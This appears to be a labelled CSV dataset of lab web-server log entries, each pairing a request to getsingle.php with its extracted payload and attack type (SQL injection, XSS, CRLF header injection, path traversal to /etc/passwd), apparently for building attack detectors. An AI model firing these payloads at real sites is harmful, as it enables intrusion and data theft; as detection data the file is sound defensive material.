"Request Date","IP Address","Packet","Dangerous Payload","Attack Type"
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input='%20UNION%20SELECT%20sum(price)%20from%20product%20--%20 HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",' UNION SELECT sum(price) from product -- ,SQL Injection
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=';WAITFOR%20DELAY%20'0:0:30'-- HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",';WAITFOR DELAY '0:0:30'--,SQL Injection
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%2c(select%20*%20from%20(select(sleep(10)))a) HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",",(select * from (select(sleep(10)))a)",SQL Injection
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=Bob%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
","Bob

<script>alert(document.domain)</script>",XSS
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%5Cr%5CnHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",\r\nHeader-Test:BLATRUC,CLRF
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
","//www.google.com//..
Header-Test:BLATRUC",CLRF
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",../../../../etc/passwd,Path Transversal
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=../../../../../etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",../../../../../etc/passwd,Path Transversal
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%25250AHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",%250AHeader-Test:BLATRUC,CLRF
27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=file:///etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
",file:///etc/passwd,Path Transversal
